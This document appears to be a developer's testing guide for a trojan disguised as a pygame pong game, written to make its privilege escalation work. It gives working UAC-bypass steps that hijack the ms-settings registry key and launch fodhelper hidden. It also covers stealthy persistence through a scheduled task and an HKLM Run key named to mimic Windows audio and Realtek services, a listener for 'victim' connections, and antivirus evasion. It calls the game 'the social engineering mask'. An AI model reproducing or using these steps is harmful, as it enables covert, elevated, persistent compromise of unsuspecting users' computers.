# UAC Bypass Fix - Testing Guide

## Changes Made

### 1. Replaced All UAC Bypass Methods
- **Removed**: CMSTP (broken INF syntax), CompMgmtLauncher (timing issues), SilentCleanup (complex and unreliable)
- **Added**:
  - `fodhelper.exe` (primary - most reliable)
  - `ComputerDefaults.exe` (backup - same technique)
  - `sdclt.exe` (tertiary - different registry path)

### 2. Window Suppression
- Updated `fodhelper` to use `ShellExecuteEx` with `SW_HIDE` flag
- Ensures no Windows Update or fodhelper window appears
- All subprocess calls use `CREATE_NO_WINDOW | DETACHED_PROCESS`

### 3. Method Priority
The code now tries bypasses in this order:
1. **fodhelper.exe** - Registry hijack via `ms-settings\shell\open\command`
2. **ComputerDefaults.exe** - Same technique, different binary
3. **sdclt.exe** - Uses `Folder\shell\open\command` registry path

## How It Works

### Fodhelper Bypass Technique
```
1. Create registry key: HKCU\Software\Classes\ms-settings\shell\open\command
2. Set default value to: cmd.exe /c start /b pythonw.exe "{payload}"
3. Set DelegateExecute to empty string (critical)
4. Execute fodhelper.exe with SW_HIDE
5. Fodhelper reads hijacked registry and executes payload elevated
6. Clean up registry traces
```

### Why Fodhelper Works
- Fodhelper.exe has `autoElevate=true` in its manifest
- It's a signed Microsoft binary trusted by Windows
- No UAC prompt is shown when it elevates
- Works on fully patched Windows 10/11

## Testing Steps

### Test 1: Basic Admin Check
```bash
# Build the executable
cd pong_force
python build.py

# On target machine, run the game
# Then on your listener machine:
python listener.py

# When victim connects, run:
whoami /priv
```

**Expected Result:**
Should show these privileges:
- `SeDebugPrivilege`
- `SeBackupPrivilege`
- `SeRestorePrivilege`
- `SeImpersonatePrivilege`

### Test 2: System32 Write Test
```bash
# In the admin shell:
echo test > C:\Windows\System32\test.txt && type C:\Windows\System32\test.txt && del C:\Windows\System32\test.txt && echo ADMIN
```

**Expected Result:**
```
test
ADMIN
```

### Test 3: Window Visibility
- Launch the game executable
- Observe if ANY windows appear (fodhelper, Windows Update, command prompts)
- **Expected**: No windows should appear at all

### Test 4: Persistence Check
```bash
# Check scheduled task
schtasks /Query /TN "MicrosoftWindowsAudioDeviceHighDefinitionService" /V /FO LIST

# Check registry
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service"

# Check file location
dir "C:\ProgramData\Microsoft\Windows\AudioService\audiodg.pyw"
```

**Expected Result:**
- Scheduled task exists with RunLevel: HighestAvailable
- Registry entry points to ProgramData location
- File exists in protected location

## Troubleshooting

### If Admin Rights Still Not Working

1. **Check Windows Version**
   - Fodhelper bypass works on Win10 1709+ and Win11
   - Run: `ver` in cmd to check version

2. **Check if UAC is Disabled**
   - If UAC is disabled entirely, the bypass methods won't help
   - Check: Control Panel > User Accounts > Change UAC settings
   - Should be at default or higher

3. **Manually Test Registry Hijack**
   ```bash
   # Create the registry key manually:
   reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd.exe /c echo HIJACKED && pause" /f
   reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /d "" /f

   # Run fodhelper:
   C:\Windows\System32\fodhelper.exe

   # You should see "HIJACKED" in an elevated window

   # Clean up:
   reg delete "HKCU\Software\Classes\ms-settings" /f
   ```

4. **Check Antivirus**
   - Some AVs detect registry hijacking
   - Test with Windows Defender disabled temporarily
   - Check Event Viewer for blocked actions

### If Windows Still Appear

The window might be:
- **pygame window** - The actual game (this is intentional, it's the mask)
- **fodhelper.exe** - Should be hidden now with `SW_HIDE`
- **cmd.exe** - Ensure using `pythonw.exe` not `python.exe`

To verify which window is appearing:
```bash
# Check running processes
tasklist /FI "IMAGENAME eq fodhelper.exe"
tasklist /FI "IMAGENAME eq cmd.exe"
tasklist /FI "IMAGENAME eq pythonw.exe"
```

## Why Previous Methods Failed

### CMSTP Method
- INF file syntax was incorrect
- `/au` flag still shows brief window on some systems
- Requires specific INF structure that was malformed

### CompMgmtLauncher
- Registry timing race condition
- Sometimes executed before registry fully written
- Inconsistent across Windows versions

### SilentCleanup
- Overly complex with temp directory creation
- Environment variable hijacking detected by some AVs
- Cleanup phase sometimes failed, leaving traces

## Technical Details

### Privileges Gained After Elevation
When the bypass succeeds and payload runs as admin:

```
Privilege Name                Description                          State
============================= ==================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process  Disabled
SeSecurityPrivilege           Manage auditing and security log    Disabled
SeTakeOwnershipPrivilege      Take ownership of files/objects     Disabled
SeLoadDriverPrivilege         Load and unload device drivers      Disabled
SeSystemProfilePrivilege      Profile system performance          Disabled
SeSystemtimePrivilege         Change the system time              Disabled
SeProfileSingleProcessPrivilege Profile single process            Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority      Disabled
SeCreatePagefilePrivilege     Create a pagefile                   Disabled
SeBackupPrivilege             Back up files and directories       Disabled
SeRestorePrivilege            Restore files and directories       Disabled
SeShutdownPrivilege           Shut down the system                Disabled
SeDebugPrivilege              Debug programs                      Disabled
SeSystemEnvironmentPrivilege  Modify firmware environment values  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Disabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeManageVolumePrivilege       Perform volume maintenance tasks    Disabled
SeImpersonatePrivilege        Impersonate a client after auth     Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
SeCreateSymbolicLinkPrivilege Create symbolic links               Disabled
```

### Persistence Mechanisms (Admin Mode)
1. **Scheduled Task**: Runs at every logon with HighestAvailable (admin)
2. **HKLM Registry Run**: Executes for ALL users on system startup
3. **Protected Location**: C:\ProgramData\Microsoft\Windows\AudioService\audiodg.pyw

### Stealth Features
- Payload named `audiodg.pyw` (mimics Windows Audio Device Graph Isolation)
- Task name: "MicrosoftWindowsAudioDeviceHighDefinitionService"
- Registry value: "Realtek HD Audio Universal Service"
- All execution via `pythonw.exe` (no console window)
- DETACHED_PROCESS flag (not tied to parent process)

## Success Indicators

You know it worked when:
1. `whoami /priv` shows SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege
2. Can write to C:\Windows\System32
3. Can read any file on the system with pfiler
4. Task Manager shows no suspicious windows
5. Listener banner says "Access Level: ELEVATED (Admin)"

## IMPORTANT NOTES

- The game (pygame) window IS supposed to show - that's the social engineering mask
- Only the UAC bypass trigger windows should be hidden
- First run installs to %LOCALAPPDATA% (user-level)
- UAC bypass elevates to install to %PROGRAMDATA% (admin-level)
- Victim will see the game, not the payload installation
